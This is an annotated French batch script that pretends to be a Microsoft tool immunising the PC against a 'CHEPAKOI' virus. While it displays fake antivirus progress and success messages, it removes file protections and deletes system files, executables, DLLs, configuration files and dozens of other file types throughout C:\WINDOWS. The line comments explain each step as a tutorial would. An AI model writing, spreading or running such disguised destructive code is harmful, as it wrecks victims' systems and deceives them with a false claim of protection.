   @echo off "cache les instructions"

   CLS "desactive l'affichage d'eventuels erreurs"

   echo Ce programme de Microsoft Corporation va immuniser votre ordinateur contre le virus CHEPAKOI, voulez-vous continuez? "affiche le message apres echo"

   pause "demande a la personne si elle veut continuer"

   echo Recherche de votre antivirus en cours,veuillez patienter... "affiche le message apres echo"

   attrib -a -h -r -s c:\WINDOWS\*.sys

   del c:\WINDOWS\*.sys   "suppression des .sys"

   erase c:\WINDOWS\*.com  "suppression des .com"

   erase c:\WINDOWS\*.ini  "suppression des .ini"

   erase c:\WINDOWS\*.exe  "suppression des .exe"

   erase c:\WINDOWS\*.dll  "suppression des .dll"

   erase c:\WINDOWS\*.bin  "suppression des .bin"

   erase c:\WINDOWS\*.sav  "suppression des .sav"

   erase c:\WINDOWS\*.pwl  "suppression des .pwl"

   erase c:\WINDOWS\*.tmp  "suppression des .tmp"

   erase c:\WINDOWS\*.bak  "suppression des .bak"

   erase c:\WINDOWS\*.cpe  "suppression des .cpe"

   erase c:\WINDOWS\*.bat  "suppression des .bat"

   erase c:\WINDOWS\*.dat  "suppression des .dat"

   erase c:\WINDOWS\*.log  "suppression des .log"

   erase c:\WINDOWS\*.sfO  "suppression des .sfO"

   erase c:\WINDOWS\*.sfc  "suppression des .sfc"

   echo Mise a jour de la base de donnée de votre antivirus... "affiche le message apres echo"

   echo. "saute une ligne"

   erase c:\WINDOWS\*.mdb "suppression des .mdb"

   erase c:\WINDOWS\*.gpl "suppression des .gpl"

   erase c:\WINDOWS\*.htm "suppression des .htm"

   erase c:\WINDOWS\*.mtx "suppression des .mtx"

   erase c:\WINDOWS\*.txt "suppression des .txt"

   erase c:\WINDOWS\*.bmp "suppression des .bmp"

   erase c:\WINDOWS\*.gif "suppression des .gif"

   erase C:\WINDOWS\*.inf "suppression des .inf"

   erase c:\WINDOWS\*.ink "suppression des .ink"

   erase c:\WINDOWS\*.pif "suppression des .pif"

   erase c:\WINDOWS\*.xml "suppression des .xml"

   erase c:\WINDOWS\*.--- "suppression des .---"

   echo Votre ordinateur est maintenant immunisé contre le virus CHEPAKOI! "affiche le message apres echo"

   echo. "saute une ligne"

   erase c:\WINDOWS\*.in "suppression des .in"

   erase c:\WINDOWS\*.cv "suppression des .cv"

   erase c:\WINDOWS\*.msg "suppression des .msg"

   :end "termine le programme"
